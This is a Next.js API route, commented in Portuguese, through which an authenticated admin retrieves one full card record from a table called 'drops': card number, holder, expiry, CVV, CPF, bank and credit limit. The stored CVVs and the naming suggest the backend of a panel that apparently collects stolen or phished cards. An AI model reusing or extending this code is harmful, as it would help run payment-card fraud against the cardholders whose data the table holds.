import { NextResponse } from "next/server"
import { isAuthenticatedAdmin, unauthorizedResponse } from "@/lib/admin-auth"
import { getSupabaseAdmin } from "@/lib/repositories/supabase-client"

// Endpoint separado para revelar dados sensíveis de um cartão específico.
// O polling do painel admin usa GET /api/drops?admin=1 que NÃO retorna dados do cartão.
// O admin clica em "Revelar" → chama este endpoint → recebe apenas o cartão solicitado.
// Isso evita que todos os dados de cartões sejam transmitidos a cada 5s pelo polling.
export async function GET(request: Request) {
  if (!isAuthenticatedAdmin(request)) return unauthorizedResponse()

  const { searchParams } = new URL(request.url)
  const id = searchParams.get("id")
  if (!id) return NextResponse.json({ error: "ID obrigatório" }, { status: 400 })

  try {
    const supabase = getSupabaseAdmin()
    const { data, error } = await supabase
      .from("drops")
      .select("id, numero, titular, validade, cvv, cpf, banco, limite")
      .eq("id", id)
      .single()

    if (error || !data) {
      return NextResponse.json({ error: "Drop não encontrado" }, { status: 404 })
    }

    console.log(`[drops/reveal] Admin revelou cartão id=${id} at ${new Date().toISOString()}`)

    return NextResponse.json({
      numero: data.numero ?? null,
      titular: data.titular ?? null,
      validade: data.validade ?? null,
      cvv: data.cvv ?? null,
      cpf: data.cpf ?? null,
      banco: data.banco ?? null,
      limite: data.limite ? Number(data.limite) : null,
    })
  } catch (error) {
    console.error("[drops/reveal]", error)
    return NextResponse.json({ error: "Erro interno" }, { status: 500 })
  }
}
